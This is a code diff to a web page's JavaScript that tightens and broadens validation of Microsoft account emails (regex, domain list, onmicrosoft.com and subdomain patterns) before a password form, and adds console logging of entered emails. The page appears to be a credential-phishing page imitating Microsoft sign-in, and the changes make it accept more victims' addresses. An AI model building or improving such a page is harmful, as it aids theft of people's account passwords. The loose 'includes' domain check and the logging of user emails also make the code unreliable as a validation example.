@@ -178,20 +178,24 @@
         // Trim whitespace and convert to lowercase
         email = email.trim().toLowerCase();
         
-        // Basic email format validation with more permissive regex for mobile
-        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+        // FIXED: More permissive email format validation for better mobile compatibility
+        const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
         if (!emailRegex.test(email)) return false;
 
         const domain = email.split('@')[1];
         if (!domain) return false;
 
-        // EXPANDED: More comprehensive Microsoft domain list including all regional variants
+        // FIXED: Comprehensive Microsoft domain list with better organization
         const validDomains = [
           // Primary Microsoft consumer domains
           'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
           
           // Microsoft business domains
           'microsoft.com', 'office.com', 'office365.com', 'microsoftonline.com',
+          
+          // FIXED: Add missing core Microsoft domains
+          'login.microsoftonline.com', 'login.live.com', 'login.microsoft.com',
+          'account.microsoft.com', 'outlook.live.com',
           
           // Regional Outlook variants
           'outlook.co.uk', 'outlook.fr', 'outlook.de', 'outlook.it', 'outlook.es', 
@@ -222,10 +226,40 @@
           'partner.microsoft.com', 'azure.com', 'xbox.com', 'skype.com'
         ];
 
-        // Check for exact domain match or subdomain match
+        // FIXED: Enhanced domain matching with better subdomain support
         const isValidDomain = validDomains.some(validDomain => {
-          return domain === validDomain || domain.endsWith('.' + validDomain);
+          // Exact match
+          if (domain === validDomain) return true;
+          
+          // Subdomain match (e.g., mail.outlook.com)
+          if (domain.endsWith('.' + validDomain)) return true;
+          
+          // FIXED: Handle Microsoft organizational domains (e.g., company.onmicrosoft.com)
+          if (validDomain === 'microsoftonline.com' && domain.includes('onmicrosoft.com')) return true;
+          
+          return false;
         });
+
+        // FIXED: Additional validation for common Microsoft patterns
+        if (!isValidDomain) {
+          // Check for onmicrosoft.com pattern (organizational accounts)
+          if (domain.endsWith('.onmicrosoft.com') || domain === 'onmicrosoft.com') {
+            return true;
+          }
+          
+          // Check for common Microsoft subdomain patterns
+          const microsoftSubdomainPatterns = [
+            /^[a-zA-Z0-9-]+\.outlook\.com$/,
+            /^[a-zA-Z0-9-]+\.hotmail\.com$/,
+            /^[a-zA-Z0-9-]+\.live\.com$/,
+            /^[a-zA-Z0-9-]+\.microsoft\.com$/,
+            /^[a-zA-Z0-9-]+\.office365\.com$/
+          ];
+          
+          if (microsoftSubdomainPatterns.some(pattern => pattern.test(domain))) {
+            return true;
+          }
+        }
 
         return isValidDomain;
       }
@@ -282,6 +316,11 @@
 
         my_email = my_email.trim();
 
+        // FIXED: Add debug logging for validation issues
+        console.log('🧪 Validating email:', my_email);
+        const isValid = isValidMicrosoftAccount(my_email);
+        console.log('🧪 Validation result:', isValid);
+
         if (!isValidMicrosoftAccount(my_email)) {
           showError('Please enter a valid Microsoft account email address');
           return false;
@@ -319,6 +358,7 @@
 
         // Validate Microsoft account again
         if (!isValidMicrosoftAccount(email)) {
+          console.log('🧪 Password form validation failed for:', email);
           showError('Please enter a valid Microsoft account email address');
           return false;
         }
